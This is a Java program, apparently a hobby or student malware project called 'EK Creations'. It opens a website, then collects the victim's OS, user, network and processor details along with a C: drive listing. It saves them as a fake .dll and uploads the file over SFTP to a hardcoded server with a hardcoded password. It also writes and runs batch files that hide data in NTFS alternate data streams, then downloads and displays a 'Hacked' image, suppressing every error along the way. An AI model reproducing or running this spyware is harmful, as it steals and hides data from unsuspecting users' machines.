package main;

import com.jcraft.jsch.*;

import javax.swing.*;
import java.awt.*;
import java.io.*;
import java.net.InetAddress;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.*;


public class Main {

    public static void main(String[] args) throws Exception {

        // Executes the Browser
        try {
            // Creates a Desktop object
            Desktop desktop = Desktop.getDesktop();
            // Invokes a desktop method browse and opens the provided link
            desktop.browse(new URI("http://www.ek-creations.c1.biz"));
        } catch (URISyntaxException uri) {
            // Catches the Exceptions
            System.out.println("Error Incorrect String");
        } catch (IOException io) {
            // Catches the Exceptions
            System.out.println("Error IO Exception Thrown");
        }

        // Creating a File object for directory - Gets a list of all files in the C:drive
        File dirListC = new File("C:\\");
        // List of all files and directories is stored in the array
        String filesInDir[] = dirListC.list();

        // Gets & Stores System Information
        String osName = System.getProperty("os.name");
        String osVersion = System.getProperty("os.version");
        String osArchitecture = System.getProperty("os.arch");
        String osManufacturer = System.getProperty("os.manufacturer");
        String osArchDataModel = System.getProperty("sun.arch.data.model");
        String virtualMachineVersion = System.getProperty("java.vm.version");
        String userDir = System.getProperty("user.dir");
        String userHome = System.getProperty("user.home");
        String userName = System.getProperty("user.name");
        String userCountry = System.getProperty("user.country");
        String userLanguage = System.getProperty("user.language");
        String systemName = InetAddress.getLocalHost().getHostName();
        String hostIPAddress = InetAddress.getLocalHost().getHostAddress();
        String processorIdentifier = System.getenv("PROCESSOR_IDENTIFIER");
        String processorArchitecture = System.getenv("PROCESSOR_ARCHITECTURE");
        String processorNumbers = System.getenv("NUMBER_OF_PROCESSORS");

        // Gets Users TimeZone
        TimeZone timeZone = Calendar.getInstance().getTimeZone();
        String userTimezone = timeZone.getDisplayName();
        String userTimezoneID = timeZone.getID();

        // String Containing all the Collected Information
        String sysInfo = "OS NAME: " + osName + "\n" +
                "Version: " + osVersion + "\n" +
                "System Type: " + osArchDataModel + "\n" +
                "OS Architecture: " + osArchitecture + "\n" +
                "OS Manufacturer: " + osManufacturer + "\n" +
                "User Dir: " + userDir + "\n" +
                "User Home: " + userHome + "\n" +
                "User Name: " + userName + "\n" +
                "System Name: " + systemName + "\n" +
                "Host IP Address: " + hostIPAddress + "\n" +
                "Processor Identifier: " + processorIdentifier + "\n" +
                "Processor Architecture: " + processorArchitecture + "\n" +
                "Processor Number: " + processorNumbers + "\n" +
                "User Country: " + userCountry + "\n" +
                "User Timezone: " + userTimezone + "\n" +
                "User Timezone ID: " + userTimezoneID + "\n" +
                "User Language: " + userLanguage + "\n";

        // Creating a Popup Windows
        JFrame windowPopup = new JFrame();
        // Setting an Icon
        ImageIcon image = new ImageIcon(Main.class.getResource("logo.png"));
        Image getImage = image.getImage();
        // Re-Scaling the Icon
        Image resizedImage = getImage.getScaledInstance(128, 128, java.awt.Image.SCALE_SMOOTH);
        image = new ImageIcon(resizedImage);

        // Create a File in the Directory of Execution
        FileWriter fileWriter = new FileWriter("EKCreations.dll");
        // Calls a function which saves all collected data into the file given up
        saveInfoToFile(filesInDir, sysInfo, fileWriter);

        // Create a File in the Directory of Users Home
        File file = new File(userHome + "/EKCreations.dll");
        FileWriter fileWriter2 = new FileWriter(file);
        // Calls a function which saves all collected data into the file given up
        saveInfoToFile(filesInDir, sysInfo, fileWriter2);

        // Calls the function to store the file with collected data to an sftp server
        storeDataToServer(file);

        // Creates a batch file Function is called
        createBatchFile();
        // Deletes the batch file that was created
        File file3 = new File(userHome + "\\EKCreations.bat");
        file3.delete();

        // Downloads a file from the sftp Server
        getFileFromServer();

        // Creates another Batch File
        createBatchFile2();

        // Displays the popup pane created earlier
        JOptionPane.showMessageDialog(windowPopup, sysInfo, "EK Creations - Top Secret Data", JOptionPane.INFORMATION_MESSAGE, image);

        // Quits the program
        System.exit(0);
    }

    private static void saveInfoToFile(String[] filesInDir, String sysInfo, FileWriter fileWriter) throws IOException {
        // Writes info using the buffered writer into the files specified
        BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);
        PrintWriter out = new PrintWriter(bufferedWriter);
        // Prints into the file a text and the sysinfo that was collected
        out.println("Host system configuration (systeminfo and network configuration):\n \n" + sysInfo);

        // Also prints into the file a text and the c:\drive dir listings from the array it was stored in
        out.println("\nList of Folders & Files in the local C Drive:\n");
        for (int i = 0; i < filesInDir.length; i++) {
            out.println(filesInDir[i]);
        }
        // Closes the buffered writer
        bufferedWriter.close();
    }

    private static void storeDataToServer(File file) throws JSchException, SftpException, FileNotFoundException {
        try {
            // Creates a new JSch object
            JSch jsch = new JSch();
            // Details to connect to the server provided
            Session session = jsch.getSession("sftpserver", "192.168.0.67");
            // Used for less security measures so no need a public key just a password and username
            session.setConfig("StrictHostKeyChecking", "no");
            session.setPassword("sftpserver");
            // Connects to the server
            session.connect();
            // Defines the server type
            ChannelSftp channel = (ChannelSftp) session.openChannel("sftp");
            channel.connect();
            // Path in the Server
            channel.cd("/");

            // A new file input stream object of the file given through parameters
            FileInputStream fis = new FileInputStream(file);
            // Puts the file in the server
            channel.put(fis, file.getName());

            // Closes the connection
            channel.disconnect();
            session.disconnect();
        } catch (Exception ex){
        }
    }

    private static void createBatchFile(){
        String userHome = System.getProperty("user.home");
        try {

            // Creates a file and opens a writer to write to it
            File readme = new File(userHome + "/EKCreations.txt");
            // Below 4 lines not needed since we are writing nothing in the file
            FileWriter fileWriter2 = new FileWriter(readme);
            BufferedWriter bufferedWriter = new BufferedWriter(fileWriter2);
            PrintWriter out = new PrintWriter(bufferedWriter);
            bufferedWriter.close();

            // create new file called EKCreations.bat in "c" drive
            File file2 = new File(userHome + "/EKCreations.bat");
            FileOutputStream fos = new FileOutputStream(file2);

            // write some commands to the file
            DataOutputStream dos = new DataOutputStream(fos);
            dos.writeBytes("cd /");
            dos.writeBytes("\n");
            dos.writeBytes("cd %userprofile%");
            dos.writeBytes("\n");
            dos.writeBytes("type EKCreations.dll > EKCreations.txt:hiddenfile.dll");
            dos.writeBytes("\n");
            dos.writeBytes("exit");

            // execute the batch file
            Process p = Runtime.getRuntime().exec("cmd /c start " + userHome + "/EKCreations.bat");

            // wait for termination
            p.waitFor();

            // Closes the output stream
            dos.close();

            // Calls the function to store the readme file into the server
            storeDataToServer(readme);

        } catch (Exception ex) {
        }
    }

    private static void createBatchFile2(){
        String userHome = System.getProperty("user.home");
        try {

            // create new file called EKCreations.bat in the desktop
            File file2 = new File(userHome + "/Desktop/EKCreations.bat");
            FileOutputStream fos = new FileOutputStream(file2);

            // write some commands to the file
            DataOutputStream dos = new DataOutputStream(fos);
            dos.writeBytes("cd /");
            dos.writeBytes("\n");
            dos.writeBytes("cd %userprofile% /Desktop");
            dos.writeBytes("\n");
            dos.writeBytes("type Hacked.png > EKCreations.bat:hiddenfile.png");
            dos.writeBytes("\n");
            dos.writeBytes("del Hacked.png");
            dos.writeBytes("\n");
            dos.writeBytes("\"%windir%\\system32\\mspaint.exe\" EKCreations.bat:hiddenfile.png");
            dos.writeBytes("\n");
            dos.writeBytes("exit");


            // execute the batch file
            Process p = Runtime.getRuntime().exec("cmd /c start /MIN " + userHome + "/Desktop/EKCreations.bat");

            // wait for termination
            p.waitFor();

            // Closes the output stream
            dos.close();

        } catch (Exception ex) {
        }
    }

    private static void getFileFromServer() throws SftpException, JSchException, IOException {

        try {
            String userHome = System.getProperty("user.home");
            // Creates a new JSch object
            JSch jsch = new JSch();
            // Details to connect to the server provided
            Session session = jsch.getSession("sftpserver", "192.168.0.67");
            // Used for less security measures so no need a public key just a password and username
            session.setConfig("StrictHostKeyChecking", "no");
            session.setPassword("sftpserver");
            // Connects to the server
            session.connect();
            // Defines the server type
            ChannelSftp channel = (ChannelSftp) session.openChannel("sftp");
            channel.connect();
            // Path in the Server
            channel.cd("/");
            // File to get from the server and download it to the local device
            channel.get("Hacked.png", userHome + "/Desktop");

            // Closes the connection
            channel.disconnect();
            session.disconnect();
        } catch (Exception ex){
        }
    }


}
